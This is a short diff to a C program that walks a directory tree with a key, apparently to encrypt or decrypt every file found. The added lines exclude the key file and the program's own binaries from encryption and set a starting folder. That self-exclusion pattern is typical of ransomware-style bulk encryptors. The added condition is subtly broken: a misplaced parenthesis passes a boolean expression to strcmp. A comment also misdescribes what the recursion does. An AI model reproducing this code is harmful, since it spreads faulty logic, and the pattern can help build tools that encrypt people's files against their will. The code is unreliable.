@@ -142,6 +142,10 @@ void recursiveSearch(unsigned char *key, char *dirName) {
             recursiveSearch(key, pathLocation);
         } else {            
             snprintf(pathLocation, sizeof(pathLocation), "%s/%s", dirName, entry->d_name);
+            // Blacklist files to avoid encryption on
+            if (!strcmp(entry->d_name, "key.txt") || !strcmp(entry->d_name, "main.out" || !strcmp(entry->d_name, "main.exe"))) {
+                continue;
+            }
             printf("%s\n", pathLocation);
             //decrypt(key, pathLocation);
         }
@@ -169,6 +173,8 @@ int main (int argc, char *argv[]) {
         fclose(f_key);
     }
     
+    // Set the starting point for the recursion to search from.
+    // Anything below this directory will not be scanned and encrypted.
     char directory[] = "files";
     recursiveSearch(key, directory);
 
